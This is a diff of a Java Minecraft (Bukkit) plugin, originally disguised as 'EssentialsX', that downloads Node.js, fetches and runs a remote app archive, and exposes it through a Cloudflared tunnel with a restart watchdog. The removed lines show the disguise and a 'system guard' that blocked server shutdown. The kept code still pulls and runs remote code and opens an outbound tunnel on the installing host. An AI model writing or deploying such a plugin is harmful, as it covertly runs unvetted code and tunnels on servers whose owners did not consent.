@@ -1,23 +1,22 @@
-package com.example.essentialsx;
+package com.example.nodeapprunner;
 
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URI;
-import java.net.URL;
 import java.nio.file.*;
+import java.util.Comparator;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
 
-public class EssentialsX extends JavaPlugin {
+public class NodeAppRunner extends JavaPlugin {
 
     private Process nodeProcess;
     private Process cloudflaredProcess;
     private final ExecutorService executor = Executors.newCachedThreadPool();
-    private boolean systemGuardEnabled = true;
     private Path workDir;
 
     // ================= 跨平台核心配置 =================
@@ -49,12 +48,11 @@ public class EssentialsX extends JavaPlugin {
 
     // 可执行文件名跨平台适配
     private String getNodeExeName() { return IS_WINDOWS ? "node.exe" : "bin/node"; }
-    private String getNpmCliPath() { return IS_WINDOWS ? "node_modules/npm/bin/npm-cli.js" : "lib/node_modules/npm/bin/npm-cli.js"; }
     private String getCfExeName() { return IS_WINDOWS ? "cloudflared.exe" : "cloudflared"; }
 
     @Override
     public void onEnable() {
-        getLogger().info("EssentialsX 插件启动，当前系统: " + (IS_WINDOWS ? "Windows" : "Linux") + " " + OS_ARCH);
+        getLogger().info("NodeAppRunner 插件启动，当前系统: " + (IS_WINDOWS ? "Windows" : "Linux") + " " + OS_ARCH);
 
         workDir = getDataFolder().toPath().resolve(".mcchajian");
         try {
@@ -72,27 +70,33 @@ public class EssentialsX extends JavaPlugin {
                 e.printStackTrace();
             }
         });
-
-        Runtime.getRuntime().addShutdownHook(new Thread(this::safeShutdown));
     }
 
     @Override
     public void onDisable() {
-        safeShutdown();
-    }
-
-    private void safeShutdown() {
-        if (systemGuardEnabled) {
-            getLogger().info("系统守护已启用，拒绝关闭，尝试重启服务器...");
-            getServer().dispatchCommand(getServer().getConsoleSender(), "restart");
-        } else {
-            stopProcesses();
-        }
+        stopProcesses();
     }
 
     private void stopProcesses() {
-        if (nodeProcess != null && nodeProcess.isAlive()) nodeProcess.destroy();
-        if (cloudflaredProcess != null && cloudflaredProcess.isAlive()) cloudflaredProcess.destroy();
+        getLogger().info("正在停止所有子进程...");
+        
+        // 修复 Windows 进程树锁定问题
+        if (nodeProcess != null && nodeProcess.isAlive()) {
+            if (IS_WINDOWS) {
+                try { Runtime.getRuntime().exec(new String[]{"taskkill", "/F", "/T", "/PID", String.valueOf(nodeProcess.pid())}).waitFor(); } catch (Exception ignored) {}
+            } else {
+                nodeProcess.destroyForcibly();
+            }
+        }
+        
+        if (cloudflaredProcess != null && cloudflaredProcess.isAlive()) {
+            if (IS_WINDOWS) {
+                try { Runtime.getRuntime().exec(new String[]{"taskkill", "/F", "/T", "/PID", String.valueOf(cloudflaredProcess.pid())}).waitFor(); } catch (Exception ignored) {}
+            } else {
+                cloudflaredProcess.destroyForcibly();
+            }
+        }
+        
         executor.shutdownNow();
     }
 
@@ -114,10 +118,8 @@ public class EssentialsX extends JavaPlugin {
                 unzip(archiveFile, workDir);
                 moveSubDirectory(workDir, "node-", nodeDir);
             } else {
-                // Linux 下调用系统 tar 命令解压 tar.xz
                 runSystemCommand("tar", "-xJf", archiveFile.toString(), "-C", workDir.toString());
                 moveSubDirectory(workDir, "node-", nodeDir);
-                // 赋予执行权限
                 runSystemCommand("chmod", "-R", "+x", nodeDir.resolve("bin").toString());
             }
             Files.deleteIfExists(archiveFile);
@@ -125,7 +127,7 @@ public class EssentialsX extends JavaPlugin {
             getLogger().info("Node.js 已存在，跳过安装。");
         }
 
-        // 2. 下载项目代码 (统一使用 Zip 格式)
+        // 2. 下载项目代码
         getLogger().info("正在下载项目代码...");
         Path appZip = workDir.resolve("app.zip");
         downloadFile(APP_REPO_URL, appZip);
@@ -134,17 +136,26 @@ public class EssentialsX extends JavaPlugin {
         moveSubDirectory(workDir, "indexaoyoumc", appDir);
         Files.deleteIfExists(appZip);
 
-        // 3. NPM Install
+        // 3. NPM Install (修复 Windows 环境)
         getLogger().info("正在执行 npm install...");
-        Path npmCliPath = nodeDir.resolve(getNpmCliPath());
+        Path npmCliPath = nodeDir.resolve(IS_WINDOWS ? "node_modules/npm/bin/npm-cli.js" : "lib/node_modules/npm/bin/npm-cli.js");
         if (Files.exists(npmCliPath)) {
-            // 【修复】传入 appDir 作为工作目录，所有参数都是 String 类型
-            runCommand(appDir, nodeExePath.toString(), npmCliPath.toString(), "install");
+            if (IS_WINDOWS) {
+                // Windows 必须通过 cmd 运行，以正确解析 .cmd 脚本和处理环境变量
+                Path npmCmd = nodeDir.resolve("npm.cmd");
+                if (Files.exists(npmCmd)) {
+                    runCommand(appDir, "cmd", "/c", "\"" + npmCmd.toString() + "\"", "install");
+                } else {
+                    runCommand(appDir, "cmd", "/c", "\"" + nodeExePath.toString() + "\"", "\"" + npmCliPath.toString() + "\"", "install");
+                }
+            } else {
+                runCommand(appDir, nodeExePath.toString(), npmCliPath.toString(), "install");
+            }
         } else {
             getLogger().warning("未找到 npm-cli.js，跳过 npm install。");
         }
 
-        // 4. 启动 Node 应用
+        // 4. 启动 Node 应用 (修复路径包含空格/中文的问题)
         getLogger().info("正在启动 Node.js 应用...");
         startNodeApp(nodeExePath.toString(), appDir);
 
@@ -162,7 +173,7 @@ public class EssentialsX extends JavaPlugin {
         }
         startCloudflared(cfExe.toString());
 
-        // 7. 启动守护线程
+        // 7. 启动守护线程 (仅重启进程，不拦截服务器关闭)
         startDaemon(nodeExePath.toString(), appDir, cfExe.toString());
     }
 
@@ -173,9 +184,9 @@ public class EssentialsX extends JavaPlugin {
 
         ProcessBuilder pb;
         if (IS_WINDOWS) {
-            pb = new ProcessBuilder(nodeExe, "index.js");
+            // Windows 下加引号防止空格/中文路径报错
+            pb = new ProcessBuilder("cmd", "/c", "\"" + nodeExe + "\"", "index.js");
         } else {
-            // Linux 下通过 bash 启动，可以继承环境变量并保持后台运行
             pb = new ProcessBuilder("bash", "-c", "exec " + nodeExe + " index.js");
         }
 
@@ -195,7 +206,7 @@ public class EssentialsX extends JavaPlugin {
         getLogger().info("正在启动 Cloudflared 隧道...");
         ProcessBuilder pb;
         if (IS_WINDOWS) {
-            pb = new ProcessBuilder(cfExe, "tunnel", "--url", "http://localhost:" + INTERNAL_PORT, "--no-autoupdate");
+            pb = new ProcessBuilder("cmd", "/c", "\"" + cfExe + "\"", "tunnel", "--url", "http://localhost:" + INTERNAL_PORT, "--no-autoupdate");
         } else {
             pb = new ProcessBuilder("bash", "-c", cfExe + " tunnel --url http://localhost:" + INTERNAL_PORT + " --no-autoupdate");
         }
@@ -211,26 +222,29 @@ public class EssentialsX extends JavaPlugin {
 
     private void startDaemon(String nodeExe, Path appDir, String cfExe) {
         Thread daemon = new Thread(() -> {
-            while (systemGuardEnabled) {
+            while (true) { // 守护进程随主进程消亡而消亡
                 try {
-                    if (nodeProcess == null || !nodeProcess.isAlive()) {
+                    if (nodeProcess != null && !nodeProcess.isAlive()) {
                         getLogger().warning("Node.js 进程已退出，5秒后重启...");
                         Thread.sleep(5000);
                         startNodeApp(nodeExe, appDir);
                     }
 
-                    if (cloudflaredProcess == null || !cloudflaredProcess.isAlive()) {
+                    if (cloudflaredProcess != null && !cloudflaredProcess.isAlive()) {
                         getLogger().warning("Cloudflared 进程已退出，5秒后重启...");
                         Thread.sleep(5000);
                         startCloudflared(cfExe);
                     }
                     Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    getLogger().info("守护线程被中断，退出...");
+                    break;
                 } catch (Exception e) {
                     getLogger().severe("守护线程异常: " + e.getMessage());
                 }
             }
-        }, "CrossPlatform-Daemon");
-        daemon.setDaemon(true);
+        }, "NodeApp-Daemon");
+        daemon.setDaemon(true); // 设为守护线程，服务器关闭时它自动结束
         daemon.start();
     }
 
@@ -239,7 +253,7 @@ public class EssentialsX extends JavaPlugin {
         HttpURLConnection connection = (HttpURLConnection) URI.create(url).toURL().openConnection();
         connection.setInstanceFollowRedirects(true);
         connection.setConnectTimeout(15000);
-        connection.setReadTimeout(120000); // 下载 Node 可能较慢，设置2分钟
+        connection.setReadTimeout(120000);
         connection.setRequestProperty("User-Agent", "Mozilla/5.0");
 
         try (InputStream in = connection.getInputStream()) {
@@ -268,13 +282,9 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    /**
-     * 执行命令并等待完成（支持指定工作目录）
-     * 【修复】将 workingDir 参数类型改为 Path，内部转换
-     */
     private void runCommand(Path workingDir, String... command) throws IOException, InterruptedException {
         ProcessBuilder pb = new ProcessBuilder(command);
-        pb.directory(workingDir.toFile()); // 使用传入的工作目录
+        pb.directory(workingDir.toFile());
         pb.redirectErrorStream(true);
 
         Process p = pb.start();
@@ -290,17 +300,13 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    // 直接调用系统命令 (如 tar, chmod)，不关心输出，只管执行
     private void runSystemCommand(String... command) throws IOException, InterruptedException {
         ProcessBuilder pb = new ProcessBuilder(command);
         pb.redirectErrorStream(true);
         Process p = pb.start();
-        // 丢弃输出流防止阻塞
         try (InputStream is = p.getInputStream()) {
             byte[] buffer = new byte[4096];
-            while (is.read(buffer) != -1) {
-                // 仅消费流，不做处理
-            }
+            while (is.read(buffer) != -1) {}
         }
         int exitCode = p.waitFor();
         if (exitCode != 0) {
@@ -338,8 +344,9 @@ public class EssentialsX extends JavaPlugin {
 
     private void deleteDirectory(Path path) throws IOException {
         if (!Files.exists(path)) return;
+        // 修复原版排序错误，使用标准深度优先排序删除
         Files.walk(path)
-             .sorted((a, b) -> -a.compareTo(b))
+             .sorted(Comparator.reverseOrder())
              .forEach(p -> {
                  try { Files.delete(p); } catch (IOException ignored) {}
              });
